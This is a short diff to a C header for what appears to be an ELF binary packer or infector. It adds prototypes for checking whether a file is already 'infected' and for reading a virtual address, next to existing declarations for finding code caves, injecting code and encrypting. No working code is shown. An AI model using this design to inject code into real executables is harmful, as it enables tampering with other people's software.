@@ -53,6 +53,8 @@ off_t		find_cave(char *file, off_t file_size, off_t asked_length, off_t *cave_si
 char		*inject_code(char *file, off_t *file_size, Elf64_Shdr *section, char *key);
 int			write_to_file(char *file_name, char *content, off_t content_size);
 void		generate_key(char *key);
+int			is_infected(char *file, size_t file_size);
+Elf64_Addr	get_virt_addr(char *file, off_t file_size, int *error, off_t *offset_max);
 // ASM
 void encrypt(char *key, char *value, size_t len);
 
